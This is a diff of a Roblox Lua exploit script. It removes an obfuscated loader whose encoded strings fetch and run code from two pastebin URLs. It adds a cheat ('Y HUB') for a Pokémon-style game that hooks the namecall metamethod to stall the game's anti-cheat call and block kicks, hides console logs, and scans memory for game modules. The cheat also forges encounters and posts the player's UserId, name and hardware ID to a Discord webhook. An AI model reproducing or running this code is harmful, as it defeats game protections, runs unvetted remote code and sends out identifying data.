@@ -1,2 +1,721 @@
 
-do local v0=tonumber;local v1=string.byte;local v2=string.char;local v3=string.sub;local v4=string.gsub;local v5=string.rep;local v6=table.concat;local v7=table.insert;local v8=getfenv or function()return _ENV;end;local v9=setmetatable;local v10=pcall;local v11=select;local v12=unpack or table.unpack;local v13=tonumber;local function v14(v15,v16,...)local v17=1;local v18;v15=v4(v3(v15,5),"..",function(v29)if (v1(v29,2)==79) then v18=v0(v3(v29,1,1));return "";else local v64=v2(v0(v29,16));if v18 then local v77=v5(v64,v18);v18=nil;return v77;else return v64;end end end);local function v19(v30,v31,v32)if v32 then local v65=862 -(82 + 780);local v66;while true do if (v65==(0 -0)) then v66=(v30/(((1607 -(1141 + 457)) -7)^(v31-(1 + 0))))%(((992 -(169 + 585)) -(144 + 92))^(((v32-(1 -0)) -(v31-1)) + (1492 -(1073 + 418))));return v66-(v66%(1820 -((1722 -(289 + 919)) + 1305)));end end else local v67=0 -0;local v68;while true do if (v67==((0 -0) -0)) then v68=(1 + 1)^(v31-((4 -3) + 0));return (((v30%(v68 + v68))>=v68) and (1708 -(1344 + 363))) or 0;end end end end local function v20()local v37=1377 -(142 + 1235);local v38;while true do if (v37==(1161 -(1036 + (372 -247)))) then v38=v1(v15,v17,v17);v17=v17 + 1;v37=1706 -(1365 + 340);end if (v37==(3 -(380 -(215 + 163)))) then return v38;end end end local function v21()local v39=0 -0;local v40;local v41;while true do if (v39==(1 + 0)) then return (v41 * (1740 -(756 + 728))) + v40;end if ((1155 -(808 + 347))==v39) then v40,v41=v1(v15,v17,v17 + (1161 -(593 + 318 + 248)));v17=v17 + 1 + 1;v39=2 -1;end end end local function v22()local v42=0 + 0;local v43;local v44;local v45;local v46;while true do if (v42==(1 + (1430 -(808 + 622)))) then return (v46 * (16779180 -(833 + 1131))) + (v45 * 65536) + (v44 * ((1373 -(149 + 14)) -(579 + 375))) + v43;end if (v42==(0 + 0)) then v43,v44,v45,v46=v1(v15,v17,v17 + ((310 + 132) -((993 -(191 + 709)) + 346)));v17=v17 + 4;v42=319 -(148 + 170);end end end local function v23()local v47=v22();local v48=v22();return (( -(1643 -(799 + 842)) * v19(v48,1965 -(528 + 1405))) + (1 -(1503 -(1414 + 89)))) * (2^(v19(v48,(31 -13) + 3,81 -50) -(509 + 514))) * ((((v19(v48,1586 -(430 + 1155),2 + 18) * ((808 -(295 + 511))^((2130 -766) -(661 + 271 + 400)))) + v47)/(((9 -5) -2)^(49 + 1 + 2))) + 1);end local function v24(v33)local v49=0;local v50;local v51;while true do if (v49==(7 -5)) then v51={};for v78=1, #v50 do v51[v78]=v2(v1(v3(v50,v78,v78)));end v49=204 -(195 + (1801 -(717 + 1078)));end if (v49==(8 -5)) then return v6(v51);end if ((1888 -(261 + 1626))==v49) then v50=v3(v15,v17,(v17 + v33) -(402 -(211 + 190)));v17=v17 + v33;v49=1 + 1;end if (((0 -0) -0)==v49) then v50=nil;if  not v33 then v33=v22();if (v33==(0 -(0 -0))) then return "";end end v49=1298 -(472 + 825);end end end local v25=v22;local function v26(...)return {...},v11("#",...);end local function v27()local v52=0 + 0;local v53;local v54;local v55;local v56;local v57;local v58;local v59;local v60;while true do if (v52~=(4 -3)) then else local v75=0;while true do if (v75~=1) then else v52=6 -4;break;end if (v75==0) then v55=nil;v56=nil;v75=1;end end end if (v52~=(2 + 1)) then else local v76=0 + 0;while true do if (v76~=(2 -1)) then else v52=17 -13;break;end if ((851 -(49 + 802))==v76) then v59=nil;v60=nil;v76=1 + 0;end end end if (v52~=4) then else while true do if (v53~=0) then else local v80=1167 -(658 + 509);while true do if (v80~=(2 -1)) then else v53=1;break;end if (v80~=0) then else v54=0;v55=nil;v80=1;end end end if (v53~=1) then else local v81=0;local v82;while true do if (v81==0) then v82=0 -0;while true do if (v82==1) then v53=4 -2;break;end if (v82~=(0 + 0)) then else local v105=983 -(284 + 699);while true do if (v105~=1) then else v82=1;break;end if (v105~=0) then else v56=nil;v57=nil;v105=2 -1;end end end end break;end end end if (v53==2) then local v83=0 -0;local v84;while true do if (v83==(0 + 0)) then v84=0;while true do if (v84~=1) then else v53=1613 -(612 + 998);break;end if (v84==(0 -0)) then local v106=0;while true do if (1~=v106) then else v84=1;break;end if (v106~=0) then else v58=nil;v59=nil;v106=1;end end end end break;end end end if (v53==3) then v60=nil;while true do local v85=0 -0;local v86;while true do if (v85==(0 -0)) then v86=0;while true do if (v86==1) then if (v54~=(3 -1)) then else local v110=0;local v111;while true do if (v110==0) then v111=895 -(844 + 51);while true do local v122=0 -0;while true do if (v122~=0) then else if (v111~=0) then else for v160=1,v22() do local v161=0;local v162;local v163;local v164;while true do if ((1388 -(113 + 1275))==v161) then local v176=0 + 0;while true do if (v176~=0) then else v162=0;v163=nil;v176=1 + 0;end if (v176==(1002 -(544 + 457))) then v161=1 + 0;break;end end end if (v161==(2 -1)) then v164=nil;while true do if (v162==(0 -0)) then local v181=0;while true do if (v181==(4 -3)) then v162=1;break;end if ((1827 -(134 + 1693))==v181) then local v189=0 + 0;while true do if (v189~=0) then else v163=0;v164=nil;v189=1 -0;end if (v189==1) then v181=1;break;end end end end end if (v162==(1962 -(752 + 1209))) then while true do if (v163==(0 + 0)) then v164=v20();if (v19(v164,1,1)==0) then local v197=0;local v198;local v199;local v200;local v201;local v202;local v203;while true do if (v197~=(2 -0)) then else v202=nil;v203=nil;v197=3;end if (v197==(714 -(406 + 307))) then v200=nil;v201=nil;v197=2;end if (v197~=3) then else while true do if (v198==2) then v203=nil;while true do if (v199==0) then local v206=0;while true do if (v206~=(0 + 0)) then else v200=0;v201=nil;v206=1;end if ((1340 -(1269 + 70))==v206) then v199=3 -2;break;end end end if (1==v199) then local v207=0 + 0;while true do if (v207==(2 -1)) then v199=2 + 0;break;end if (v207~=(0 + 0)) then else v202=nil;v203=nil;v207=1;end end end if (v199==2) then while true do if (v200==3) then if (v19(v202,3,3)==1) then v203[4]=v60[v203[535 -(168 + 363)]];end v55[v160]=v203;break;end if (v200==2) then local v209=0 + 0;local v210;while true do if (v209~=0) then else v210=152 -(77 + 75);while true do if (v210~=0) then else local v218=0;while true do if (v218~=(0 + 0)) then else if (v19(v202,1,1943 -(1628 + 314))~=1) then else v203[4 -2]=v60[v203[2]];end if (v19(v202,2,1 + 1)==1) then v203[3]=v60[v203[1 + 2]];end v218=1 -0;end if ((93 -(74 + 18))==v218) then v210=1;break;end end end if (v210==(1753 -(786 + 966))) then v200=1061 -(78 + 980);break;end end break;end end end if (1~=v200) then else local v211=1841 -(331 + 1510);while true do if ((1 + 0)~=v211) then else v200=7 -5;break;end if (v211~=(0 + 0)) then else local v216=0;local v217;while true do if (v216~=(0 -0)) then else v217=0;while true do if (v217~=(0 -0)) then else local v220=0;while true do if (v220~=1) then else v217=1 -0;break;end if (v220~=(0 -0)) then else v203={v21(),v21(),nil,nil};if (v201==(0 -0)) then local v225=0;local v226;while true do if (v225~=(0 + 0)) then else v226=0 + 0;while true do if (v226~=(0 -0)) then else v203[1800 -(467 + 1330)]=v21();v203[4]=v21();break;end end break;end end elseif (v201==(1460 -(162 + 1297))) then v203[765 -(388 + 374)]=v22();elseif (v201==(2 -0)) then v203[3]=v22() -((4 -2)^16);elseif (v201~=3) then else local v231=0;while true do if (v231==(1034 -(84 + 950))) then v203[3 + 0]=v22() -((2 -0)^(1 + 15));v203[4]=v21();break;end end end v220=1;end end end if (v217==(1 + 0)) then v211=1;break;end end break;end end end end end if (v200~=0) then else local v212=1397 -(1053 + 344);local v213;while true do if (v212~=0) then else v213=0;while true do if (v213~=(1226 -(847 + 378))) then else v200=1 + 0;break;end if (v213~=0) then else local v219=0;while true do if (v219~=(0 -0)) then else v201=v19(v164,2,107 -(8 + 96));v202=v19(v164,1774 -(24 + 1746),11 -5);v219=1 -0;end if ((1 + 0)==v219) then v213=2 -1;break;end end end end break;end end end end break;end end break;end if (v198~=(0 + 0)) then else local v204=0;while true do if (v204~=1) then else v198=1;break;end if (v204~=(0 -0)) then else v199=0 + 0;v200=nil;v204=619 -(42 + 576);end end end if (v198~=1) then else local v205=0;while true do if (v205~=(244 -(174 + 70))) then else v201=nil;v202=nil;v205=1;end if (v205~=(1 + 0)) then else v198=5 -3;break;end end end end break;end if (v197~=(0 -0)) then else v198=0;v199=nil;v197=1;end end end break;end end break;end end break;end end end for v165=1,v22() do v56[v165-(1 -0)]=v27();end v111=1 -0;end if (v111==(1 + 0)) then local v150=0 -0;local v151;while true do if (v150==(0 -0)) then v151=0;while true do if ((216 -(110 + 106))~=v151) then else local v179=0 + 0;while true do if (v179~=(1383 -(102 + 1281))) then else for v190=1,v22() do v57[v190]=v22();end return v58;end end end end break;end end end break;end end end break;end end end break;end if (v86~=(0 + 0)) then else local v107=0;while true do if (v107~=(1 + 0)) then else v86=1;break;end if (v107~=0) then else if (v54==1) then local v118=252 -(129 + 123);local v119;while true do if (v118~=(0 + 0)) then else v119=0;while true do if (v119~=(0 -0)) then else local v152=0 + 0;while true do if (v152~=1) then else v119=956 -(27 + 928);break;end if (v152==(0 + 0)) then v59=v22();v60={};v152=1;end end end if (v119==(1 + 0)) then local v153=0 + 0;while true do if (v153~=1) then else v119=2;break;end if ((0 -0)==v153) then local v175=0;while true do if (v175==(0 -0)) then for v182=1,v59 do local v183=0;local v184;local v185;while true do if (v183~=1) then else if (v184==1) then v185=v20()~=(836 -(637 + 199));elseif (v184==(568 -(97 + 469))) then v185=v23();elseif (v184==(1062 -(785 + 274))) then v185=v24();end v60[v182]=v185;break;end if (v183==(997 -(161 + 836))) then local v193=0 -0;local v194;while true do if (v193==0) then v194=1152 -(401 + 751);while true do if (v194~=1) then else v183=1;break;end if (v194~=(0 + 0)) then else v184=v20();v185=nil;v194=1 + 0;end end break;end end end end end v58[866 -(436 + 427)]=v20();v175=341 -(13 + 327);end if (v175~=1) then else v153=1;break;end end end end end if (v119~=2) then else v54=6 -4;break;end end break;end end end if (v54~=0) then else local v120=0;local v121;while true do if (v120==(0 + 0)) then v121=0;while true do if (v121==(0 + 0)) then local v154=0;while true do if (v154~=(1 + 0)) then else v121=1;break;end if (v154==(0 + 0)) then v55={};v56={};v154=2 -1;end end end if ((2 + 0)~=v121) then else v54=1;break;end if (v121~=1) then else local v155=0 -0;while true do if (v155==(4 -3)) then v121=1 + 1;break;end if (v155~=0) then else v57={};v58={v55,v56,nil,v57};v155=2 -1;end end end end break;end end end v107=1436 -(1283 + 152);end end end end break;end end end break;end end break;end if (v52~=(0 + 0)) then else v53=0;v54=nil;v52=1;end if (2~=v52) then else v57=nil;v58=nil;v52=3;end end end local function v28(v34,v35,v36)local v61=v34[1];local v62=v34[2];local v63=v34[3];return function(...)local v69=0;local v70;local v71;local v72;local v73;local v74;while true do if (v69==1) then v72={...};v73=v11("#",...) -1;v69=2;end if (3==v69) then A,B=v26(v10(v74));if  not A[1] then local v87=v34[4][v70] or "?";error("Script error at ["   .. v87   .. "]:"   .. A[2]);else return v12(A,2,B);end break;end if (v69==2) then v74=nil;v74=function()local v88=v61;local v89=v62;local v90=v63;local v91=v26;local v92={};local v93={};local v94={};for v98=0 -0,v73 do if ((v98>=v90) or ((7798 -4015)>=(677 + 3510))) then v92[v98-v90]=v72[v98 + (1 -0)];else v94[v98]=v72[v98 + (1338 -(641 + 696))];end end local v95=(v73-v90) + 1 + 0;local v96;local v97;while true do local v99=0 -0;while true do if ((v99==(3 -2)) or ((2687 -(588 + 505))>=4364)) then if (((3469 + 956)>=(1122 + 395)) and (v97<=(13 -7))) then if ((v97<=(1 + 1)) or ((668 + 1233)>(1432 + 1750))) then if ((v97<=(1605 -((1704 -418) + 319))) or ((8196 -3935)<=(3800 -(519 + 668)))) then local v112=494 -(95 + 399);local v113;local v114;local v115;local v116;local v117;while true do if (((9405 -4535)>=(3161 + 183)) and (v112==(0 + 0))) then v113=462 -(317 + (361 -216));v114=nil;v112=(543 -(292 + 249)) -1;end if (((5410 -(550 + 1317))>=(3965 -(1017 + (1381 -(946 + 202))))) and ((2 + 0)==v112)) then v117=nil;while true do if ((v113==(1 + 0)) or ((15182 -10998)<=((2183 + 410) -1407))) then local v148=49 -(36 + 13);while true do if (((1 + 0)==v148) or ((461 + 422)>(5110 -(229 + 1 + 894)))) then v113=1 + 1 + 0;break;end if ((v148==0) or ((1290 -904)>(135 + 802))) then v71=(v116 + v114) -(1 + 0);v117=(1918 -(1872 + 46)) + 0;v148=1 -0;end end end if (((6039 -(240 + 1706))>=(2281 -(12 + (1984 -(141 + 1839))))) and (v113==(0 -0))) then v114=v96[2 + 0];v115,v116=v91(v94[v114](v12(v94,v114 + 1 + 0,v96[2 + 1])));v113=1;end if (((4187 -(687 + 60))==((5250 -(102 + 6)) -(119 + 1583))) and (v113==(2 + (0 -0)))) then for v156=v114,v71 do local v157=0 + 0;local v158;local v159;while true do if ((v157==(1 + (473 -(41 + 432)))) or ((1066 + 1152)>(6598 -(1323 + 578)))) then while true do if (((6665 -3838)==(3263 -(37 + 74 + 325))) and (v158==(0 + 0))) then v159=515 -(123 + 392);while true do if ((v159==(0 + 0)) or ((6980 -(3053 -(8 + 646)))<(508 + 359))) then v117=v117 + (902 -(438 + (1635 -(1015 + 157))));v94[v156]=v115[v117];break;end end break;end end break;end if ((v157==(0 -0)) or ((944 + 452)>(12217 -8007))) then v158=0 + 0;v159=nil;v157=1272 -(312 + 959);end end end break;end end break;end if ((v112==(4 -3)) or ((9853 -5501)==(507 + 385))) then v115=nil;v116=nil;v112=1 + 1;end end elseif (((9250 -5623)>(589 + 2418)) and (v97>(1 + 0))) then do return;end else v94[v96[4 -2]]=v36[v96[168 -(61 + 104)]];end elseif ((v97<=(2 + 2)) or ((376 + 36)==(554 + 2787))) then if ((v97>(12 -(711 -(575 + 127)))) or ((686 + 1708)<=(7 + 79))) then v70=v96[2 + 1];else v94[v96[4 -2]]=v96[1879 -(699 + 1177)];end elseif ((v97==(3 + 2)) or ((4478 -2380)>=(14881 -11340))) then if ( not v94[v96[2]] or ((14865 -11460)==(2426 + 668))) then v70=v70 + (1 -(0 -0));else v70=v96[10 -(16 -9)];end else v94[v96[1424 -(582 + 840)]]=v94[v96[6 -3]][v96[541 -(339 + 198)]];end elseif ((v97<=(1716 -((4498 -3583) + 791))) or ((4466 -1516)==(423 + 3034))) then if ((v97<=(12 -4)) or ((405 -165)>=(2412 -(667 + 491)))) then if ((v97>(1 + 6)) or ((859 + 1854 + 1451)<(4093 -(209 + 19 + 1142)))) then local v130=438 -(226 + 212);local v131;local v132;while true do if ((v130==(1889 -(901 + 849 + 139))) or ((1599 + 2562)==(3141 -1622))) then v131=0 + 0;v132=nil;v130=418 -((739 -532) + 210);end if ((v130==(288 -(223 + 64))) or (((1968 -1151) -(60 + (249 -116)))>(2462 -1143))) then while true do if (((7093 -3286)<=(1150 + 2942)) and (v131==((0 -0) -0))) then v132=v96[(3 + 1) -2];v94[v132]=v94[v132](v12(v94,v132 + 1 + 0,v71));break;end end break;end end else v94[v96[1276 -(333 + 941)]]();end elseif (((52 + 234)<=(4806 -(2037 + 1263))) and (v97>(5 + 4))) then if (((12888 -(9553 -(314 + 43)))>=(1835 + 864 + 312)) and (v96[2 + 0]==v94[v96[(7386 -5818) -(212 + 1352)]])) then v70=v70 + ((1 + 2) -2);else v70=v96[3 + 0];end elseif ((v94[v96[2 + 0]]==v96[1 + 3]) or ((3924 -(290 + 886))==(4226 + 540 + 136))) then v70=v70 + 1 + 0;else v70=v96[3];end elseif ((v97<=(9 + 1 + 2)) or ((8327 -4567)<((90 + 2499) -(322 + 662)))) then if ((v97>(385 -(326 + 48))) or (4123<(8 + 181))) then v94[v96[(29 -(16 + 9)) -2]][v96[4 -1]]=v96[580 -(111 + 465)];else v94[v96[948 -(597 + 349)]]=v96[1 + 2]~=(776 -(128 + 648));end elseif (((3499 -2316)<(3652 -(40 + 127))) and (v97>13)) then local v136=0 -0;local v137;local v138;local v139;while true do if (((1548 + 2584)==((18087 -12008) -1947)) and (v136==(0 + 0))) then v137=0 -0;v138=nil;v136=(261 -(89 + 1)) -(157 + 13);end if (((1610 -1012)>((1130 -778) -(68 + 24))) and (v136==(452 -(362 + 89)))) then v139=nil;while true do if ((v137==(0 -0)) or ((6348 -2990)>=(11370 -7523))) then local v169=0 -0;while true do if ((v169==(0 -0)) or ((3978 -(1199 + 328))>(3465 -(517 + 267)))) then v138=624 -(353 + 271);v139=nil;v169=(1 -0) -0;end if (((1954 -((1950 -(815 + 758)) + 1576))==v169) or ((437 + 159)>(11436 -7825))) then v137=1 + 0;break;end end end if ((v137==(1 + 0)) or (((11270 -8553) + 1585)<(4855 -1613))) then while true do if ((v138==0) or (((679 -(280 + 122)) + 972)==(2755 + 1469))) then v139=v96[(5 -3) -0];v94[v139]=v94[v139]();break;end end break;end end break;end end else local v140=0;local v141;local v142;local v143;while true do if ((v140==(0 + 0)) or ((3806 + 242)==(868 + 910))) then local v147=1407 -(1347 + 60);while true do if ((v147==(1 + 0)) or ((5656 -3540)<=(1991 -(636 + (368 -281))))) then v140=39 -(8 + 30);break;end if (((62 + 3157)<=(11278 -6944)) and (v147==(245 -(55 + 190)))) then v141=515 -(75 + 440);v142=nil;v147=1 + 0;end end end if (((275 + 896)<=(780 + 4018)) and ((4 -3)==v140)) then v143=nil;while true do if ((v141==(0 -0)) or (((4982 -(1102 + 222)) -(958 + 147))>(4042 -(108 + 6)))) then local v170=0;local v171;while true do if (((12972 -9366)<(7163 -2206)) and ((1026 -(680 + 346))==v170)) then v171=0 + 0 + 0;while true do if ((v171==1) or (118>((2336 -(60 + 124)) -(34 + 32)))) then v141=1 + 0;break;end if (((43 + 468)==(1817 -(354 + 952))) and (v171==(278 -(150 + 128)))) then local v186=1619 -(214 + 388 + 1017);while true do if (((11696 -6957)>(347 + 1332)) and (v186==(2 -1))) then v171=1;break;end if (((5436 -3929)>=(1635 -(148 + 90))) and (v186==(0 + 0))) then v142=v96[1261 -(1187 + 72)];v143=v94[v96[1 + 2]];v186=1 + 0;end end end end break;end end end if (((46 + 32)<(4923 -(813 + 748))) and (v141==1)) then v94[v142 + ((1 + 0) -0)]=v143;v94[v142]=v143[v96[11 -7]];break;end end break;end end end v70=v70 + (860 -(228 + 631));break;end if ((((5729 -(180 + 437)) -(612 + (495 -254)))>(1452 + 2635)) and (v99==(0 + 0))) then local v104=0 -0;while true do if (((1 -0)==v104) or ((2317 -1227)>=(2565 + 1018))) then v99=3 -2;break;end if ((v104==(0 -0)) or ((10321 -6249)<(13 + 2091))) then v96=v88[v70];v97=v96[(401 -(62 + 337)) -(650 -(392 + 257))];v104=388 -(271 + 116);end end end end end end;v69=3;end if (v69==0) then v70=1;v71= -1;v69=1;end end end;end return v28(v27(),{},v16)(...);end v14("LOL!0C3O00028O00027O0040030A3O006C6F6164737472696E6703043O0067616D6503073O00482O747047657403213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F796532643677426903073O0067657467656E76031C3O00426C6F636B5F457865637574696F6E5F666F725F53656375726974792O01026O00F03F03213O00682O7470733A2O2F706173746562696E2E636F6D2F7261772F345343383269453603063O004C6F61646564002B3O0012033O00013O0026093O000C00010002002O043O000C0001001201000100033O001201000200043O00200D000200020005001203000400064O000B000500016O000200054O000800013O00022O0007000100010001002O043O002A00010026093O001800010001002O043O00180001001201000100074O000E0001000100020020060001000100080026090001001400010009002O043O001400012O00023O00013O001201000100074O000E00010001000200300C0001000800090012033O000A3O000E0A000A000100013O002O043O00010001001201000100033O001201000200043O00200D0002000200050012030004000B4O000B000500016O000200054O000800013O00022O0007000100010001001201000100074O000E00010001000200200600010001000C0006050001002800010001002O043O002800012O00023O00013O0012033O00023O002O043O000100012O00023O00017O002B3O00023O00043O00043O00053O00053O00053O00053O00053O00053O00053O00053O00063O00083O00083O00093O00093O00093O00093O00093O000A3O000C3O000C3O000C3O000D3O000F3O000F3O00103O00103O00103O00103O00103O00103O00103O00103O00113O00113O00113O00113O00113O00123O00143O00153O00173O00",v8(),...);end
+--[[
+          __                   __  __ __  ____  ____ ___  _____
+   __  __/ /   ____  _________/ /_/ // /_/ __ \/ __ \__ \|__  /
+  / / / / /   / __ \/ ___/ __  /_  _  __/ / / / / / /_/ / /_ < 
+ / /_/ / /___/ /_/ / /  / /_/ /_  _  __/ /_/ / /_/ / __/___/ / 
+ \__, /_____/\____/_/   \__,_/ /_//_/  \____/\____/____/____/  
+/____/                                                         
+                   
+]]
+
+task.delay(5,function()
+if not LPH_OBFUSCATED then
+    LPH_JIT_MAX = function(...) return(...) end;
+    LPH_NO_VIRTUALIZE = function(...) return(...) end;
+end
+
+local CoreGui = game:GetService("CoreGui")
+
+CoreGui.ChildAdded:Connect(function(Element)
+if Element.Name == "DevConsoleMaster" then
+
+local DevConsole = CoreGui:WaitForChild("DevConsoleMaster")
+local DevWindow = DevConsole:WaitForChild("DevConsoleWindow")
+local DevUI = DevWindow:WaitForChild("DevConsoleUI")
+local MainView = DevUI:WaitForChild("MainView")
+local ClientLog = MainView:WaitForChild("ClientLog")
+
+ClientLog.ChildAdded:Connect(function(Element)
+     if Element:IsA("GuiObject") and Element.Name == Element.Name:match("%d+") then
+          Element:Destroy()
+     end
+end)
+end
+end)
+
+local Disables = {
+    game:GetService("ScriptContext").Error,
+    game:GetService("LogService").MessageOut
+}
+
+for i, v in pairs(Disables) do
+    for i, v in pairs(getconnections(v)) do
+        v:Disable()
+    end
+end
+
+LPH_JIT_MAX(function()
+local NewArgs, NewMethod = nil,nil
+
+local old;old = hookmetamethod(game, "__namecall", function(self, ...)
+    NewMethod = getnamecallmethod()
+    
+    if NewMethod == "FireServer"  then
+    NewArgs = {...}
+    if NewArgs[2] == "AntiCheat" then
+        return wait(9e9) -- cant decompile ur shit, but suck my balls about this
+    end
+end
+
+if NewMethod == "Kick" or NewMethod == "kick" then
+
+    if getfenv(old).script.Name ~= "ClientMover" then
+        return wait(9e9)
+    end
+end
+
+
+    return old(self, ...)
+end)
+end)()
+
+
+game:GetService("Players").LocalPlayer.Idled:connect(
+        function()
+            game:GetService("VirtualUser"):ClickButton2(Vector2.new())
+        end)
+
+
+
+
+--//Services
+local RunService = game:GetService("RunService")
+local Players = game:GetService("Players")
+local Workspace = game:GetService("Workspace")
+ 
+--Imports
+
+--//Player Variables
+local Player = Players.LocalPlayer
+local Character = Player.Character or Player.CharacterAdded:Wait()
+local PlayerParts = {}
+local Camera = Workspace.CurrentCamera
+local PlayerExploit = is_sirhurt_closure and "Sirhurt" or pebc_execute and "ProtoSmasher" or syn and "Synapse X" or secure_load and "Sentinel" or KRNL_LOADED and "Krnl" or SONA_LOADED and "Sona" or "Kid with shit exploit"
+local FinalString = nil
+local ChunkEncountersIds = {
+    
+    ["Flowers"] = {
+        ChunkId = "chunk15",
+        RealName = "MiscEncounter"
+    };
+
+    ["Grass"] = {
+        ChunkId = "Any",
+        RealName = "Grass"
+    };
+
+    ["Candles"] = {
+        ChunkId = "chunk13",
+        RealName = "Candle"
+    }
+}
+
+--//WebHook Variables
+local WebHookLink, NewData, ExploitRequest, FinalData = getgenv().WebHook, nil, nil, nil
+local ReportData = {
+    ["content"] = "**Y HUB** ||@".."everyone||", 
+    ["embeds"] = {
+        {
+            ["title"] = "<PBF>  Auto-finder waiting for action!",
+            ["description"] = "UserId: ".. Player.UserId.. "\nUsername: "..Player.Name.."\nDetected Exploit : "..PlayerExploit.. "\nRegistered HWID: "..game:GetService("RbxAnalyticsService"):GetClientId(),
+            ["type"] = "rich",
+            ["color"] = tonumber(0x1269da),
+            ["image"] = {
+                ["url"] = "https://cdn.dribbble.com/users/1413861/screenshots/4532760/media/22010b4b8e14f098fd032fd4b1a9e511.gif"
+ 
+            }
+        }
+    }
+ }
+ 
+--//Global Variables
+getgenv().AutoFinderStatus = false
+getgenv().GetVariations = false
+getgenv().GetShiny = false
+getgenv().ShinyMode = "Any Shiny"
+getgenv().NoClip = false
+getgenv().AutoFinderDelay = 2.68
+getgenv().WebHookNotify = false
+getgenv().InfRepel = false
+getgenv().LoterryRollback = false
+getgenv().FishingMode = false 
+getgenv().Rod = "GoodRod"
+getgenv().ChunkEncounter = "Grass"
+ 
+--//Imports
+
+--//Plugins
+local _p = {} 
+ LPH_JIT_MAX(function()
+for Index, Variable in pairs(getgc(true)) do
+    if typeof(Variable) == "table" then
+ 
+    if rawget(Variable, "currentChunk") then _p["RegionData"] = Variable end
+    if rawget(Variable, "doWildBattle") then _p["Battle"] = Variable end
+    if rawget(Variable, "post") then _p["Events"] = Variable end
+    if rawget(Variable, "FadeIn") then _p["Utilities"] = Variable end
+    if rawget(Variable, "getARQPacket") then _p["Tools"] = Variable end
+    if rawget(Variable, "saveGame") then _p["Menu"] = Variable end
+    if rawget(Variable, "Hidden") then _p["MasterControl"] = Variable end
+    if rawget(Variable, "updateStatus") then _p["PlayerList"] = Variable end
+
+    end
+ end 
+ end)()
+ 
+--Set Player Parts
+for Index,Part in pairs(Character:GetChildren()) do
+    if Part.ClassName == "Part" or Part.ClassName == "MeshPart" then
+        table.insert(PlayerParts,Part)
+    end
+end
+ 
+--//Auto Finder
+local AutoFinder = {}
+AutoFinder.__index = AutoFinder
+ 
+function AutoFinder.new()
+    local self = {
+ 
+        PokemonName = 'Waiting for update',
+        isShiny = 'Waiting for update',
+        CaptureRate = 'Waiting for update',
+        HiddenAbility = 'Waiting for update',
+        Variation = 'Waiting for update',
+        CurrentBattle = nil,
+        Grass = nil, FishingWater = nil, OldGrass = nil, NewGrass = nil, LastGrassRoute = nil,
+        AutoFinderConnection = nil,
+        PokemonData = nil,
+        CreateBattle = "Not created yet",
+        OldEncounterChance = nil,
+        LastCall = 0, CallingBattle = false, BattleCalled = false, Actions = nil, Found = false, RouteModel = nil,
+        TotalEncounters = 0, ShinyEncounters = 0,
+        SucessCreating = nil, Result = nil,
+        Restarting = false
+    }
+ 
+    setmetatable(self,AutoFinder)
+ 
+    return self
+end
+ 
+ 
+function AutoFinder:CanGetPokemon()
+    if self.isShiny == true and GetShiny == true then
+         
+         if ShinyMode == "Any Shiny" then
+             return true
+         end
+         
+         if ShinyMode == "WishListed Shiny" and table.find(ShinyMainWishList, self.PokemonName) then
+             return true
+         end
+         
+    end
+    return self.Variation ~= "No Variation" and GetVariations == true and true or table.find(MainWishList, self.PokemonName) and true or false
+end
+ 
+function AutoFinder:UpdateLabels()
+ 
+self.Variation = string.len(self.Variation) == 0 and "No Variation" or self.Variation
+ 
+ LabelPokemonName:UpdateLabel("Last Found: "..self.PokemonName, true)
+ LabelPokemonVariation:UpdateLabel("Variation: "..self.Variation, true)
+ LabelPokemonHiddenAbility:UpdateLabel("Ability: "..self.HiddenAbility, true)
+ LabelPokemonisShiny:UpdateLabel("Is Shiny: "..tostring(self.isShiny), true)
+ LabelPokemonCaptureRate:UpdateLabel("Capture Rate: "..self.CaptureRate, true)
+ LabelShinyEncounters:UpdateLabel("Shiny Encounters: "..self.ShinyEncounters, true)
+ LabelEncounters:UpdateLabel("Total Encounters: "..self.TotalEncounters, true)
+ 
+end
+ 
+function AutoFinder:WaitForPlayer()
+ printconsole("AutoFinder:WaitForPlayer")
+self.CurrentBattle:setupScene()
+ printconsole("setupScene")
+self.CurrentBattle:focusScene()
+ printconsole("focusScene")
+self.CurrentBattle:takeOver()
+  printconsole("takeOver")
+repeat RunService.Stepped:Wait() until self.CurrentBattle.BattleEnded --Wait for add bindevent to remove battle
+ 
+if WebHookNotify and Webhook ~= "Empty" then AutoFinder:SendRequest() end
+ 
+self.CurrentBattle.BattleEnded:wait()
+ 
+self:CleanUpBattle()
+    --Battle clean up
+end
+ 
+function AutoFinder:UpdatePokemonInfos()
+      if self.PokemonData then
+        for Index,Var in pairs (self.PokemonData) do
+ 
+            if Index == "shiny" then self.isShiny = Var end
+            if Index == "name" then self.PokemonName = Var end
+            if Index == "captureRate" then self.CaptureRate = Var end
+            if Index == "hiddenAbility" then self.HiddenAbility = Var end
+            if Index == "forme" then self.Variation = Var end
+ 
+        end
+    end
+end
+ 
+function AutoFinder:GetCorrectString()
+    for Index,CacheSting in next, self.CurrentBattle.actionQueue do
+        if CacheSting == "|" then
+           FinalString = self.CurrentBattle.actionQueue[Index-1] --Get the encouter pokemon data
+           break
+        end
+    end
+end
+ 
+function AutoFinder:GetPokemonData()
+ 
+self:GetCorrectString()
+ 
+    self.PokemonData = _p.Tools.getTemplate(string.split(FinalString,"|")[3]:sub(6)) -- cached data |pokemonName| >> Tools >> returned pokemon data table
+    self.PokemonData["shiny"] = string.find(FinalString,"shiny") and true or false --find "shiny" string on cached data
+   return self.PokemonData
+end
+ 
+function AutoFinder:CreateEncounter()
+    self.CurrentBattle = nil
+
+    if FishingMode and self.FishingWater then
+    _p.Battle.eid = self.FishingWater.id
+ 
+     self.SucessCreating, self.Result = pcall(function()
+        self.CurrentBattle = _p.Battle:new({battleSceneType = 'Fishing'})
+        return self.CurrentBattle
+    end)
+
+    _p.Battle.currentBattle = self.CurrentBattle
+ 
+    elseif self.Grass then
+
+    _p.Battle.eid = self.Grass.id
+    
+    self.SucessCreating, self.Result = pcall(function()
+        self.CurrentBattle = _p.Battle:new()
+        return self.CurrentBattle
+    end)
+
+    _p.Battle.currentBattle = self.CurrentBattle
+
+    end            
+end
+ 
+function AutoFinder:Start()
+ 
+ 
+    if self.AutoFinderConnection then self.AutoFinderConnection:Disconnect() end
+ 
+    self.AutoFinderConnection = RunService.Heartbeat:Connect(function()
+
+   if (_p.RegionData.currentChunk and _p.RegionData.currentChunk.regionData and _p.RegionData.currentChunk.regionData.Grass) then
+        self.Grass = _p.RegionData.currentChunk.regionData.Grass
+    
